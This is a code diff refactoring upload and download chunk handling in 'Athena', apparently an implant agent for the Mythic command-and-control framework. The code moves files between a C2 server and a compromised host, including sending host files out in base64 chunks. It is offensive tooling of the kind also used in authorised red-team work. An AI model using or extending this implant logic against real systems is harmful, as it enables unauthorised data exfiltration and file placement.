@@ -370,7 +370,6 @@ namespace Athena.Commands
         /// <param name="task_id">Task ID of the mythic job to respond to</param>
         private async Task<string> GetJobs(string task_id)
         {
-            //List<object> jobs = new List<object>();
             List<JobStatus> jobsStatus = new List<JobStatus>();
             foreach(var j in PluginHandler.activeJobs)
             {
@@ -423,6 +422,7 @@ namespace Athena.Commands
         public async Task HandleUploadPiece(MythicResponseResult response)
         {
             MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
+            
             if (uploadJob.cancellationtokensource.IsCancellationRequested)
             {
                 PluginHandler.activeJobs.Remove(response.task_id, out _);
@@ -433,44 +433,8 @@ namespace Athena.Commands
             {
                 uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
             }
-            if (!String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
-            {
-                await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
-                uploadJob.chunk_num++;
-                if (response.chunk_num == uploadJob.total_chunks)
-                {
-                    await this.uploadHandler.CompleteUploadJob(response.task_id);
-                    PluginHandler.activeJobs.Remove(response.task_id, out _);
-                    this.responseResults.Add(new UploadResponse
-                    {
-                        task_id=response.task_id,
-                        completed = "true",
-                        upload = new UploadResponseData
-                        {
-                            chunk_num = uploadJob.chunk_num,
-                            file_id = response.file_id,
-                            chunk_size = uploadJob.chunk_size,
-                            full_path = uploadJob.path
-                        }
-                    }.ToJson());
-                }
-                else
-                {
-                    this.responseResults.Add(new UploadResponse
-                    {
-                        task_id = response.task_id,
-                        upload = new UploadResponseData
-                        {
-                            chunk_num = uploadJob.chunk_num,
-                            file_id = response.file_id,
-                            chunk_size = uploadJob.chunk_size,
-                            full_path = uploadJob.path
-                        }
-                    }.ToJson());
-                }
 
-            }
-            else
+            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
             {
                 this.responseResults.Add(new ResponseResult
                 {
@@ -480,7 +444,33 @@ namespace Athena.Commands
                     user_output = "Mythic sent no data to upload!"
 
                 }.ToJson());
+
+                return;
             }
+
+            await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
+            uploadJob.chunk_num++;
+
+            UploadResponse ur = new UploadResponse()
+            {
+                task_id = response.task_id,
+                upload = new UploadResponseData
+                {
+                    chunk_num = uploadJob.chunk_num,
+                    file_id = response.file_id,
+                    chunk_size = uploadJob.chunk_size,
+                    full_path = uploadJob.path
+                }
+            };
+
+            if (response.chunk_num == uploadJob.total_chunks)
+            {
+                await this.uploadHandler.CompleteUploadJob(response.task_id);
+                PluginHandler.activeJobs.Remove(response.task_id, out _);
+                ur.completed = "true";
+            }
+
+            this.responseResults.Add(ur.ToJson());
         }
         /// <summary>
         /// Begin the next process of the download task
@@ -489,79 +479,64 @@ namespace Athena.Commands
         public async Task HandleDownloadPiece(MythicResponseResult response)
         {
             MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
+            
             if (downloadJob.cancellationtokensource.IsCancellationRequested)
             {
                 PluginHandler.activeJobs.Remove(response.task_id, out _);
                 await this.uploadHandler.CompleteUploadJob(response.task_id);
             }
 
-            if (string.IsNullOrEmpty(downloadJob.file_id) && string.IsNullOrEmpty(response.file_id))
+            DownloadResponse dr = new DownloadResponse()
             {
+                task_id = response.task_id,
+            };
+
+            if (String.IsNullOrEmpty(downloadJob.file_id))
+            {
+                if (string.IsNullOrEmpty(response.file_id))
+                {
+                    await this.downloadHandler.CompleteDownloadJob(response.task_id);
+                    PluginHandler.activeJobs.Remove(response.task_id, out _);
+                    dr.status = "error";
+                    dr.user_output = "No file_id received";
+                    dr.completed = "true";
+
+                    this.responseResults.Add(dr.ToJson());
+                    return;
+                }
+
+                downloadJob.file_id = response.file_id;
+            }
+
+            if(response.status != "success")
+            {
+                dr.file_id = downloadJob.file_id;
+                dr.chunk_num = downloadJob.chunk_num;
+                dr.chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob);
+
+                this.responseResults.Add(dr.ToJson());
+                return;
+            }
+
+            downloadJob.chunk_num++;
+
+            dr.user_output = String.Empty;
+            dr.full_path = String.Empty;
+            dr.total_chunks = -1;
+            dr.file_id = downloadJob.file_id;
+            dr.status = "processed";
+            dr.chunk_num = downloadJob.chunk_num;
+            dr.chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob);
+
+            if(downloadJob.chunk_num == downloadJob.total_chunks)
+            {
+                dr.status = String.Empty;
+                dr.completed = "true";
                 await this.downloadHandler.CompleteDownloadJob(response.task_id);
                 PluginHandler.activeJobs.Remove(response.task_id, out _);
-                this.responseResults.Add(new DownloadResponse
-                {
-                    task_id = response.task_id,
-                    status = "error",
-                    user_output = "No file_id received",
-                    completed = "true"
-                }.ToJson());
             }
-            else
-            {
-                if (String.IsNullOrEmpty(downloadJob.file_id))
-                {
-                    downloadJob.file_id = response.file_id;
-                }
 
-                if (response.status == "success")
-                {
-                    if (downloadJob.chunk_num != downloadJob.total_chunks)
-                    {
-                        downloadJob.chunk_num++;
-
-                        this.responseResults.Add(new DownloadResponse
-                        {
-                            task_id = response.task_id,
-                            user_output = String.Empty,
-                            status = "processed",
-                            full_path = String.Empty,
-                            total_chunks = -1,
-                            file_id = downloadJob.file_id,
-                            chunk_num = downloadJob.chunk_num,
-                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
-                        }.ToJson());
-                    }
-                    else
-                    {
-                        await this.downloadHandler.CompleteDownloadJob(response.task_id);
-                        PluginHandler.activeJobs.Remove(response.task_id, out _);
-                        this.responseResults.Add(new DownloadResponse
-                        {
-                            task_id = response.task_id,
-                            user_output = String.Empty,
-                            status = String.Empty,
-                            full_path = String.Empty,
-                            chunk_num = downloadJob.chunk_num,
-                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob),
-                            file_id = downloadJob.file_id,
-                            completed = "true",
-                            total_chunks = -1
-
-                        }.ToJson());
-                    }
-                }
-                else
-                {
-                    this.responseResults.Add(new DownloadResponse
-                    {
-                        task_id = response.task_id,
-                        file_id = downloadJob.file_id,
-                        chunk_num = downloadJob.chunk_num,
-                        chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
-                    }.ToJson());
-                }
-            }
+            this.responseResults.Add(dr.ToJson());
         }
         /// <summary>
         /// Check if an upload job exists
